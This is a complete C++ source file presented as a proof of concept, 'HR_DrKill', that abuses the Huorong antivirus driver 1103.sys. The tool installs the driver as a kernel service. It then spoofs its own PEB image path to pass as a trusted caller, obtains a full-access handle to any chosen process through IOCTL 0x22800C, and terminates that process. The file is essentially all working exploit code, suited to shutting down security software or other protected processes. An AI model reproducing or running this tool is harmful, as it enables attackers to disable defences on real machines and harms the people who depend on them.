// HR_DrKill.cpp : PoC for Huorong driver arbitrary process termination.
// Supports --install, --kill <pid>, --uninstall commands.

#include <iostream>
#include <windows.h>
#include <intrin.h>
#include <Shlwapi.h>
#include <winsvc.h>

// ---------------------------------------------------------------------------
// Driver service constants
// ---------------------------------------------------------------------------
#define SERVICE_NAME      L"HRSysUtils"
#define DRIVER_FILENAME   L"1103.sys"
#define SPOOF_FILENAME    L"ABCD.tmp"
#define DEVICE_PATH       L"\\\\.\\HRKill::SysUtils"
#define IOCTL_OPEN_PROCESS 0x22800Cu

// ---------------------------------------------------------------------------
// Forward-declared opaque pointer used by PEB definitions below.
// ---------------------------------------------------------------------------
typedef struct _RTL_USER_PROCESS_PARAMETERS* PRTL_USER_PROCESS_PARAMETERS;
#define RTL_MAX_DRIVE_LETTERS 32

// ---------------------------------------------------------------------------
// NT PEB / loader structures (undocumented, needed for image-path spoofing)
// ---------------------------------------------------------------------------
typedef struct _PEB_LDR_DATA
{
    ULONG Length;
    BOOLEAN Initialized;
    HANDLE SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
    PVOID EntryInProgress;
    BOOLEAN ShutdownInProgress;
    HANDLE ShutdownThreadId;
} PEB_LDR_DATA, * PPEB_LDR_DATA;

typedef struct _UNICODE_STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PWCH Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _STRING
{
    USHORT Length;
    USHORT MaximumLength;
    _Field_size_bytes_part_opt_(MaximumLength, Length) PCHAR Buffer;
} STRING, * PSTRING, ANSI_STRING, * PANSI_STRING, OEM_STRING, * POEM_STRING;

typedef struct _CURDIR
{
    UNICODE_STRING DosPath;
    HANDLE Handle;
} CURDIR, * PCURDIR;

typedef struct _RTL_DRIVE_LETTER_CURDIR
{
    USHORT Flags;
    USHORT Length;
    ULONG TimeStamp;
    STRING DosPath;
} RTL_DRIVE_LETTER_CURDIR, * PRTL_DRIVE_LETTER_CURDIR;

typedef struct _RTL_USER_PROCESS_PARAMETERS
{
    ULONG MaximumLength;
    ULONG Length;

    ULONG Flags;
    ULONG DebugFlags;

    HANDLE ConsoleHandle;
    ULONG ConsoleFlags;
    HANDLE StandardInput;
    HANDLE StandardOutput;
    HANDLE StandardError;

    CURDIR CurrentDirectory;
    UNICODE_STRING DllPath;
    UNICODE_STRING ImagePathName;
    UNICODE_STRING CommandLine;
    PVOID Environment;

    ULONG StartingX;
    ULONG StartingY;
    ULONG CountX;
    ULONG CountY;
    ULONG CountCharsX;
    ULONG CountCharsY;
    ULONG FillAttribute;

    ULONG WindowFlags;
    ULONG ShowWindowFlags;
    UNICODE_STRING WindowTitle;
    UNICODE_STRING DesktopInfo;
    UNICODE_STRING ShellInfo;
    UNICODE_STRING RuntimeData;
    RTL_DRIVE_LETTER_CURDIR CurrentDirectories[RTL_MAX_DRIVE_LETTERS];

    ULONG_PTR EnvironmentSize;
    ULONG_PTR EnvironmentVersion;

    PVOID PackageDependencyData;
    ULONG ProcessGroupId;
    ULONG LoaderThreads;

    UNICODE_STRING RedirectionDllName;
    UNICODE_STRING HeapPartitionName;
    ULONG_PTR DefaultThreadpoolCpuSetMasks;
    ULONG DefaultThreadpoolCpuSetMaskCount;
    ULONG DefaultThreadpoolThreadMaximum;
    ULONG HeapMemoryTypeMask;
} RTL_USER_PROCESS_PARAMETERS, * PRTL_USER_PROCESS_PARAMETERS;

typedef struct _PEB
{
    BOOLEAN InheritedAddressSpace;
    BOOLEAN ReadImageFileExecOptions;
    BOOLEAN BeingDebugged;
    union
    {
        BOOLEAN BitField;
        struct
        {
            BOOLEAN ImageUsesLargePages : 1;
            BOOLEAN IsProtectedProcess : 1;
            BOOLEAN IsImageDynamicallyRelocated : 1;
            BOOLEAN SkipPatchingUser32Forwarders : 1;
            BOOLEAN IsPackagedProcess : 1;
            BOOLEAN IsAppContainer : 1;
            BOOLEAN IsProtectedProcessLight : 1;
            BOOLEAN IsLongPathAwareProcess : 1;
        };
    };

    HANDLE Mutant;

    PVOID ImageBaseAddress;
    PPEB_LDR_DATA Ldr;
    PRTL_USER_PROCESS_PARAMETERS ProcessParameters;
}PEB, *PPEB;


// ---------------------------------------------------------------------------
// IOCTL request structure for the Huorong driver open-process primitive.
// ---------------------------------------------------------------------------
#pragma pack(1)
struct _OPEN_PROCESS {
    ULONG64 handle;
    ULONG DesiredAccess;
    ULONG64 Eprocess;
};
#pragma pack()

// ---------------------------------------------------------------------------
// Globals
// ---------------------------------------------------------------------------
HANDLE hDevice_SysUtils = NULL;
WCHAR  wsExeDir[MAX_PATH] = { 0 };    // directory containing this executable
WCHAR  wsScratch[MAX_PATH] = { 0 };   // scratch buffer for path building
WCHAR  wsHRPath[MAX_PATH] = { 0 };    // global buffer for PEB image-path spoof
                                       // MUST be global so the PEB Buffer pointer
                                       // remains valid when the driver reads it

// ============================= Utility =====================================

// Populate wsExeDir with the directory that contains this executable.
// Returns TRUE on success.
static BOOL GetExeDirectory()
{
    if (!GetModuleFileNameW(NULL, wsExeDir, MAX_PATH))
    {
        printf("[!] GetModuleFileNameW failed, err=%lu\n", GetLastError());
        return FALSE;
    }
    PathRemoveFileSpecW(wsExeDir);
    PathAddBackslashW(wsExeDir);
    return TRUE;
}

// Build a full path by joining wsExeDir with a filename.
// Result is written to wsScratch and also returned.
static const WCHAR* BuildPathInExeDir(const WCHAR* filename)
{
    wcscpy_s(wsScratch, MAX_PATH, wsExeDir);
    PathAppendW(wsScratch, filename);
    return wsScratch;
}

// Print command-line usage information.
static void PrintUsage()
{
    printf("HR_DrKill -- Huorong driver PoC (PhantomRay)\n");
    printf("Usage:\n");
    printf("  HR_DrKill.exe --install          Install and start the driver service\n");
    printf("  HR_DrKill.exe --kill <pid>        Terminate target process via driver\n");
    printf("  HR_DrKill.exe --uninstall        Stop and remove the driver service\n"
           "                                   (WARNING: will BSOD if driver was loaded,\n"
           "                                    1103.sys never unregisters kernel callbacks)\n");
    printf("  HR_DrKill.exe --help             Show this message\n");
}

// ========================= Driver Management ===============================

// Install and start the kernel driver via the Service Control Manager.
// The driver file (1103.sys) must reside next to this executable.
// Returns 0 on success, -1 on failure.
static INT InstallDriver()
{
    // Locate driver file next to executable
    const WCHAR* driverPath = BuildPathInExeDir(DRIVER_FILENAME);

    if (GetFileAttributesW(driverPath) == INVALID_FILE_ATTRIBUTES)
    {
        printf("[!] Driver file not found: ");
        wprintf(L"%s\n", driverPath);
        printf("[!] Place %ls next to HR_DrKill.exe\n", DRIVER_FILENAME);
        return -1;
    }

    // Open the Service Control Manager with full access
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        printf("[!] OpenSCManager failed, err=%lu (run as Administrator)\n", GetLastError());
        return -1;
    }

    // Try to create the kernel driver service
    SC_HANDLE hSvc = CreateServiceW(
        hSCM,
        SERVICE_NAME,
        SERVICE_NAME,
        SERVICE_ALL_ACCESS,
        SERVICE_KERNEL_DRIVER,
        SERVICE_DEMAND_START,
        SERVICE_ERROR_NORMAL,
        driverPath,
        NULL, NULL, NULL, NULL, NULL
    );

    if (!hSvc)
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_EXISTS)
        {
            printf("[*] Service already exists, opening it\n");
            hSvc = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_ALL_ACCESS);
            if (!hSvc)
            {
                printf("[!] OpenService failed, err=%lu\n", GetLastError());
                CloseServiceHandle(hSCM);
                return -1;
            }
        }
        else
        {
            printf("[!] CreateService failed, err=%lu\n", err);
            CloseServiceHandle(hSCM);
            return -1;
        }
    }
    else
    {
        printf("[+] Service created successfully\n");
    }

    // Start the driver
    if (!StartServiceW(hSvc, 0, NULL))
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_ALREADY_RUNNING)
        {
            printf("[*] Driver is already running\n");
        }
        else
        {
            printf("[!] StartService failed, err=%lu\n", err);
            CloseServiceHandle(hSvc);
            CloseServiceHandle(hSCM);
            return -1;
        }
    }
    else
    {
        printf("[+] Driver started successfully\n");
    }

    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    printf("[+] Install complete -- device %ls should be available\n", DEVICE_PATH);
    return 0;
}

// Stop and delete the driver service.
// Returns 0 on success, -1 on failure.
static INT UninstallDriver()
{
    SC_HANDLE hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_ALL_ACCESS);
    if (!hSCM)
    {
        printf("[!] OpenSCManager failed, err=%lu (run as Administrator)\n", GetLastError());
        return -1;
    }

    SC_HANDLE hSvc = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_ALL_ACCESS);
    if (!hSvc)
    {
        DWORD err = GetLastError();
        if (err == ERROR_SERVICE_DOES_NOT_EXIST)
        {
            printf("[*] Service does not exist, nothing to uninstall\n");
            CloseServiceHandle(hSCM);
            return 0;
        }
        printf("[!] OpenService failed, err=%lu\n", err);
        CloseServiceHandle(hSCM);
        return -1;
    }

    // Stop the driver; tolerate if it is not running
    SERVICE_STATUS svcStatus = { 0 };
    if (!ControlService(hSvc, SERVICE_CONTROL_STOP, &svcStatus))
    {
        DWORD err = GetLastError();
        if (err != ERROR_SERVICE_NOT_ACTIVE)
        {
            printf("[!] ControlService STOP failed, err=%lu\n", err);
        }
        else
        {
            printf("[*] Service is not running\n");
        }
    }
    else
    {
        printf("[+] Driver stopped\n");
    }

    // Delete the service entry from the SCM database
    if (!DeleteService(hSvc))
    {
        printf("[!] DeleteService failed, err=%lu\n", GetLastError());
        CloseServiceHandle(hSvc);
        CloseServiceHandle(hSCM);
        return -1;
    }

    printf("[+] Service deleted successfully\n");
    CloseServiceHandle(hSvc);
    CloseServiceHandle(hSCM);
    printf("[+] Uninstall complete\n");
    return 0;
}

// ========================= Kill Process ====================================

// Open a handle to the Huorong SysUtils device via CreateFileW.
// Returns 0 on success, -1 on failure.
static INT OpenDriverDevice()
{
    HANDLE FileW = CreateFileW(L"\\\\.\\HRKill::SysUtils", 0x10000000u, 3u, 0LL, 3u, 0x80u, 0LL);
    if (FileW == (HANDLE)-1LL)
    {
        wprintf(L"[!] OpenDevice HRKill::SysUtils failed, err=%lu\n", GetLastError());
        hDevice_SysUtils = 0LL;
        return -1;
    }
    wprintf(L"[+] OpenDevice HRKill::SysUtils success\n");
    hDevice_SysUtils = FileW;
    return 0;
}

// Send IOCTL 0x22800C to the driver, requesting a process handle
// with the specified access rights. The driver returns a kernel-
// opened handle that bypasses normal access checks.
// NOTE: struct must NOT be zero-initialized -- matches the original
// binary layout the driver expects on the stack.
HANDLE __fastcall HROpenProcess(ULONG64 dwProcessId, DWORD dwDesiredAccess)
{
    _OPEN_PROCESS OutBuffer; // [rsp+40h] [rbp-28h] BYREF
    DWORD BytesReturned = 0; // [rsp+78h] [rbp+10h] BYREF

    OutBuffer.handle = dwProcessId;        // overwritten by driver on output
    OutBuffer.Eprocess = NULL;
    OutBuffer.DesiredAccess = dwDesiredAccess; //0x201;
    if (DeviceIoControl(hDevice_SysUtils, 0x22800Cu, &OutBuffer, 20u, &OutBuffer, 20u, &BytesReturned, 0LL))
    {
        wprintf(L"[+] OpenProcess pid:%llu success\n", dwProcessId);
        return (HANDLE)OutBuffer.handle;
    }
    else
    {
        wprintf(L"[!] OpenProcess pid:%llu failed, err=%lu\n", dwProcessId, GetLastError());
        return NULL;
    }
}

// Spoof the PEB image path to ABCD.tmp, then open the driver device
// and terminate the target process.
// Returns 0 on success, -1 on failure.
static INT KillProcess(ULONG targetPid)
{
    // Read the PEB from the GS segment (x64 TEB->PEB).
    PEB* peb = (PEB*)__readgsqword(0x60);
    UNICODE_STRING NewPath;

    // Build a fake image path pointing to ABCD.tmp in the same
    // directory as this executable, then overwrite the PEB
    // ImagePathName so the driver sees a trusted caller.
    // NOTE: wsHRPath is a global buffer -- the PEB Buffer pointer
    // must remain valid when the driver reads it from kernel mode.
    GetModuleFileNameW(0, wsHRPath, MAX_PATH);
    PathRemoveFileSpecW(wsHRPath);
    PathAddBackslash(wsHRPath);
    PathAppendW(wsHRPath, L"ABCD.tmp");
    NewPath.Length = (USHORT)(sizeof(WCHAR) * (wcslen(wsHRPath)));
    NewPath.MaximumLength = NewPath.Length + sizeof(WCHAR);
    NewPath.Buffer = wsHRPath;
    WCHAR* pName = peb->ProcessParameters->ImagePathName.Buffer;
    wprintf(L"[*] oldpath %s\n", pName);
    memcpy(&(peb->ProcessParameters->ImagePathName), &NewPath, sizeof(UNICODE_STRING));
    pName = peb->ProcessParameters->ImagePathName.Buffer;
    wprintf(L"[*] newpath %s\n", pName);

    // Open the driver device, obtain a kernel handle to the
    // target process, and terminate it.
    if (!OpenDriverDevice())
    {
        HANDLE hProcess = HROpenProcess(targetPid, PROCESS_ALL_ACCESS);
        if (hProcess)
        {
            if (!TerminateProcess(hProcess, 0))
            {
                wprintf(L"[!] TerminateProcess failed, err=%lu\n", GetLastError());
                CloseHandle(hProcess);
                CloseHandle(hDevice_SysUtils);
                return -1;
            }
            wprintf(L"[+] Process %u terminated\n", targetPid);
            CloseHandle(hProcess);
        }
        else
        {
            wprintf(L"[!] HROpenProcess returned NULL\n");
            CloseHandle(hDevice_SysUtils);
            return -1;
        }
        CloseHandle(hDevice_SysUtils);
    }
    else
    {
        wprintf(L"[!] Cannot open driver device -- is the driver installed?\n");
        return -1;
    }

    return 0;
}

// ================================ main =====================================

int main(int argc, char** argv)
{
    if (argc < 2)
    {
        PrintUsage();
        return 1;
    }

    // Resolve the directory containing this executable (used everywhere)
    if (!GetExeDirectory())
    {
        printf("[!] Failed to determine executable directory\n");
        return 1;
    }

    // ---- --install ----
    if (_stricmp(argv[1], "--install") == 0)
    {
        return InstallDriver() == 0 ? 0 : 1;
    }

    // ---- --uninstall ----
    if (_stricmp(argv[1], "--uninstall") == 0)
    {
        return UninstallDriver() == 0 ? 0 : 1;
    }

    // ---- --kill <pid> ----
    if (_stricmp(argv[1], "--kill") == 0)
    {
        if (argc < 3)
        {
            printf("[!] --kill requires a PID argument\n");
            printf("    Usage: HR_DrKill.exe --kill <pid>\n");
            return 1;
        }

        ULONG pid = (ULONG)atoi(argv[2]);
        if (pid <= 4 || pid >= 10000000)
        {
            printf("[!] Invalid PID %lu (must be >4 and <10000000)\n", pid);
            return 1;
        }

        return KillProcess(pid) == 0 ? 0 : 1;
    }

    // ---- --help or unknown ----
    if (_stricmp(argv[1], "--help") == 0)
    {
        PrintUsage();
        return 0;
    }

    printf("[!] Unknown command: %s\n", argv[1]);
    PrintUsage();
    return 1;
}
